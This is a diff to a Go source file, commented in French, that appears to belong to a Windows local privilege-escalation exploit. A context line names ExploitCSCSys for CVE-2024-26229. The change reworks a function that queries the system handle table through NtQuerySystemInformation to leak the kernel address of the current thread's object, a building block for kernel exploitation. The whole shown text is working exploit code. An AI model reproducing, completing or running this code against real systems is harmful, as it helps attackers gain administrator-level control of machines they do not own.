@@ -52,36 +52,52 @@ func GetCurrentThreadKThreadAddress() (uintptr, error) {
 	pid, _, _ := procGetCurrentProcessId.Call()
 	tid, _, _ := procGetCurrentThreadId.Call()
 
-	procNtQuerySystemInformation.Call(
-		uintptr(SystemExtendedHandleInformation),
-		0,
-		0,
-		uintptr(unsafe.Pointer(&returnLength)),
-	)
+	// STATUS_INFO_LENGTH_MISMATCH (0xC0000004)
+	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
 
-	buffer := make([]byte, returnLength+1024)
-	ret, _, _ := procNtQuerySystemInformation.Call(
-		uintptr(SystemExtendedHandleInformation),
-		uintptr(unsafe.Pointer(&buffer[0])),
-		uintptr(len(buffer)),
-		uintptr(unsafe.Pointer(&returnLength)),
-	)
+	// On commence avec un buffer de 1 Mo, c'est souvent suffisant
+	bufferSize := uint32(0x100000)
+	var buffer []byte
+	var ret uintptr
 
-	if ret != 0 {
-		return 0, fmt.Errorf("NtQuerySystemInformation fail: 0x%x", ret)
+	// Boucle pour ajuster la taille du buffer dynamiquement
+	for {
+		buffer = make([]byte, bufferSize)
+		ret, _, _ = procNtQuerySystemInformation.Call(
+			uintptr(SystemExtendedHandleInformation),
+			uintptr(unsafe.Pointer(&buffer[0])),
+			uintptr(bufferSize),
+			uintptr(unsafe.Pointer(&returnLength)),
+		)
+
+		if ret == 0 {
+			break // Succès !
+		}
+
+		if uint32(ret) != STATUS_INFO_LENGTH_MISMATCH {
+			return 0, fmt.Errorf("NtQuerySystemInformation failure: 0x%x", ret)
+		}
+
+		// Si on a manqué de place, on prend la taille suggérée + un extra de sécurité
+		bufferSize = returnLength + 0x10000
 	}
 
 	info := (*SYSTEM_HANDLE_INFORMATION_EX)(unsafe.Pointer(&buffer[0]))
-	handles := (*[1 << 20]SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(&info.Handles[0]))
+	handleCount := int(info.NumberOfHandles)
 
-	for i := uintptr(0); i < info.NumberOfHandles; i++ {
-		handle := handles[i]
+	// Utilisation de unsafe.Pointer pour parcourir les structures
+	startOfHandles := uintptr(unsafe.Pointer(&info.Handles[0]))
+	handleSize := unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX{})
+
+	for i := 0; i < handleCount; i++ {
+		handle := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(startOfHandles + uintptr(i)*handleSize))
+
 		if handle.UniqueProcessId == pid && handle.HandleValue == tid {
 			return handle.Object, nil
 		}
 	}
 
-	return 0, fmt.Errorf("thread handle not found")
+	return 0, fmt.Errorf("thread handle not found in kernel table")
 }
 
 // ExploitCSCSys réalise l'élévation via CVE-2024-26229
